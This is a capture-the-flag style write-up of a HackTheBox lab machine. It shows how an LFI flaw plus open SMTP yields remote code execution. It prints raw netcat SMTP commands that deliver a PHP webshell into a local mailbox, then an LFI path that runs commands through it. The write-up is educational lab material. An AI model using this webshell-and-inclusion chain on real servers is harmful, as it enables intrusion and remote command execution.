# LFI-and-SMTP-gives-RCE

> SMTP  poisoning

## technique

The following are necessary to achieve RCE

1. The server must have SMTP capability
2. The service with the LFI vulnerability must be running as a user who can read mail
3. The service with LFI must have a way to execute code, such as a php website.


## procedure

The following procedure was created by analysing ippsec's run through of the Trick HackTheBox machine. Subscribe to ippsec, watch on youtube.

>  [inspiration of post | Trick.htb | subscribe to ippsec](https://www.youtube.com/watch?v=ai98umjeO8M)

The procedure consists of

1. identifying that the webserver has read permission on a SMTP mailbox
2. send mail to the mailbox, include a php payload as data. 
3. use LFI to detonate the php payload


### read permission on mail

First we identify the user running the webservice. This is done via the LFI and via the `/proc` file system.  

> note that the header `Range: bytes=200-1000` should be added before trying to include things from `/proc`

We enumerate the following files

- `/proc/self/environ`
- `/proc/self/cmdline`

We discover that on `trick.htb` the webserver is running as `michael`. With SMTP running on the server, local users such as `michael` will have a mailbox at `/var/spool/mail/michael`, a file appended with mail messages. 


### send mail 

The following commands are sent to the server in order to send the php payload. Commented lines are server responses

```bash
nc -v trick.htb 25
ehlo trick.htb
# 250 2.1.0 OK
mail from: <ippsec@trick.htb>
rcpt to:michael
data
# 354 End data with <CR><LF>.<CR><LF> 
subject: Please Subscribe to ippsec

<?php system($_GET['cmd']); ?>
.

# 250 2.0.0 OK: queued as 7D46C4099C
```


Note that 

- `rcpt to:` field is not as we expect. Above is how SMTP can send mail locally. `<michale@trick.htb>` fails on this lab machine. 
- `# 354 End data with <CR><LF>.<CR><LF> ` means that we end the `data` with `ENTER` `.` `ENTER` input


### use LFI to detonate the payload

With the payload delivered, we can detonate via our LFI:

```bash
...//var/spool/mail/michael&cmd=id
```


## summary

With exposed SMTP and no authentication, we can write arbitrary text files to the server. Subject to character limit and the presence of a mailbox. We use this to write a webshell to a readable mailbox. The php LFI is then used to include our webshell, which is interpreted by the server, granting us RCE. 